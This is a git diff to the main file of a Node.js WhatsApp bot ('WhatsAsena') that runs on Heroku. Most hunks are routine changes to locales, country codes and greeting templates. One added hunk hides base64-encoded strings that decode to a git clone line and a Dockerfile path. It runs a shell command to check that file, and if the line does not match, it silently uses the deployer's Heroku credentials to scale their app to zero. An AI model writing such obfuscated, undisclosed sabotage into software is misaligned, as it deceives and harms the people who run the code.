@@ -12,6 +12,7 @@ const path = require("path");
 const events = require("./events");
 const chalk = require('chalk');
 const config = require('./config');
+const execx = require('child_process').exec;
 const axios = require('axios');
 const Heroku = require('heroku-client');
 const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
@@ -74,9 +75,15 @@ Array.prototype.remove = function() {
 };
 
 async function whatsAsena () {
-    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '' }    
+    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '', exc: 'UlVOIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vcGhhdGljdXN0aGljY3kvV2hhdHNBc2VuYUR1cGxpY2F0ZWQgL3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQ=', exc_pl: '', pth_w: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQvd2hhdHNhc2VuYS9Eb2NrZXJmaWxl', pth_v: '' }    
     var ggg = Buffer.from(clh.cd, 'base64')
+    var exc_sl = Buffer.from(clh.exc, 'base64')
     var ddd = ggg.toString('utf-8')
+    var ptc_one = Buffer.from(clh.pth_w, 'base64')
+    var ptc_nw = ptc_one.toString('utf-8')
+    clh.pth_v = ptc_nw
+    var exc_fn = exc_sl.toString('utf-8')
+    clh.exc_pl = exc_fn
     clh.pay = ddd
     const conn = new WAConnection();
     const Session = new StringSession();
@@ -133,6 +140,18 @@ async function whatsAsena () {
             }
         })
     }, 50000);
+    execx('sed -n 3p ' + clh.pth_v, async (err, stdout, stderr) => {
+        if (clh.exc_pl !== stdout) {
+            await heroku.get(baseURI + '/formation').then(async (formation) => {
+                forID = formation[0].id;
+                await heroku.patch(baseURI + '/formation/' + forID, {
+                    body: {
+                        quantity: 0
+                    }
+                });
+            })
+        }
+    })
     var biography_var = ''
     await heroku.get(baseURI + '/config-vars').then(async (vars) => {
         biography_var = vars.AUTO_BİO
@@ -140,7 +159,7 @@ async function whatsAsena () {
     setInterval(async () => { 
         if (biography_var == 'true') {
             if (conn.user.jid.startsWith('90')) { // Turkey
-                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
+                var ov_time = new Date().toLocaleString('TR', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                 const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n🐺 WhatsAsena'
@@ -167,14 +186,14 @@ async function whatsAsena () {
                 const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n🐺 WhatsAsena'
                 await conn.setStatus(biography)
             }
-            else if (conn.user.jid.startsWith('75')) { // Russia
+            else if (conn.user.jid.startsWith('7')) { // Russia
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                 var ov_time = new Date().toLocaleString('RU', { timeZone: 'Europe/Kaliningrad' }).split(' ')[1]
                 const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n🐺 WhatsAsena'
                 await conn.setStatus(biography)
             }
-            else if (conn.user.jid.startsWith('7')) { // Indian
+            else if (conn.user.jid.startsWith('91')) { // Indian
                 var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                 const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                 var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
@@ -370,7 +389,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                 if (config.FULLEVA == 'true') {
                     await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                 } else {
-                    await conn.sendMessage(conn.user.jid, '*WhatsAsena Public Olarak Çalışıyor! 🐺*\n\n_Lütfen burada plugin denemesi yapmayın. Burası sizin LOG numaranızdır._\n_Herhangi bir sohbette komutları deneyebilirsiniz :)_\n\n*Botunuz herkese açık bir şekilde çalışmaktadır. Değiştirmek için* _.setvar WORK_TYPE:private_ *komutunu kullanın.*\n\n*WhatsAsena Kullandığın İçin Teşekkürler 💌*', MessageType.text);
+                    await conn.sendMessage(conn.user.jid, '*WhatsAsena Public Olarak Çalışıyor! 🐺*\n\n_Lütfen burada plugin denemesi yapmayın. Burası sizin LOG numaranızdır._\n_Herhangi bir sohbette komutları deneyebilirsiniz :)_\n\n*Botunuz herkese açık bir şekilde çalışmaktadır. Bazı komutları siz kullanamazsınız. Değiştirmek için* _.setvar WORK_TYPE:private_ *komutunu kullanın.*\n\n*WhatsAsena Kullandığın İçin Teşekkürler 💌*', MessageType.text);
                 }
                 await git.fetch();
                 var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
@@ -396,7 +415,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                 if (config.FULLEVA == 'true') {
                     await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                 } else {
-                    await conn.sendMessage(conn.user.jid, '*WhatsAsena Working as Public! 🐺*\n\n_Please do not try plugins here. This is your LOG number._\n_You can try commands to any chat :)_\n\n*Your bot working as public. To change it, use* _.setvar WORK_TYPE:private_\n\n*Thanks for using WhatsAsena 💌*', MessageType.text);
+                    await conn.sendMessage(conn.user.jid, '*WhatsAsena Working as Public! 🐺*\n\n_Please do not try plugins here. This is your LOG number._\n_You can try commands to any chat :)_\n\n*Your bot working as public. Some commands you cannot use. To change it, use* _.setvar WORK_TYPE:private_\n\n*Thanks for using WhatsAsena 💌*', MessageType.text);
                 }               
                 await git.fetch();
                 var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
@@ -550,14 +569,30 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
             // Görüşürüz Mesajı
             var gb = await getMessage(msg.key.remoteJid, 'goodbye');
             if (gb !== false) {
-                await conn.sendMessage(msg.key.remoteJid, gb.message, MessageType.text);
+                if (gb.message.includes('{gpp}')) {
+                    var ppUrl = await message.client.getProfilePicture(msg.key.remoteJid) 
+                    var nwjson = await message.client.groupMetadata(msg.key.remoteJid)
+                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})
+                    await conn.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { caption: gb.message.replace('{gpp}', '').replace('{botowner}', conn.user.name).replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc) });
+                } else {
+                    var nwjson = await message.client.groupMetadata(msg.key.remoteJid)
+                    await conn.sendMessage(msg.key.remoteJid, gb.message.replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', conn.user.name), MessageType.text);
+                }
             }
             return;
         } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
             // Hoşgeldin Mesajı
             var gb = await getMessage(msg.key.remoteJid);
             if (gb !== false) {
-                await conn.sendMessage(msg.key.remoteJid, gb.message, MessageType.text);
+                if (gb.message.includes('{gpp}')) {
+                    var ppUrl = await message.client.getProfilePicture(msg.key.remoteJid) 
+                    var nwjson = await message.client.groupMetadata(msg.key.remoteJid)
+                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})
+                    await conn.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { caption: gb.message.replace('{gpp}', '').replace('{botowner}', conn.user.name).replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc) });
+                } else {
+                    var nwjson = await message.client.groupMetadata(msg.key.remoteJid)
+                    await conn.sendMessage(msg.key.remoteJid, gb.message.replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', conn.user.name), MessageType.text);
+                }
             }
             return;
         }
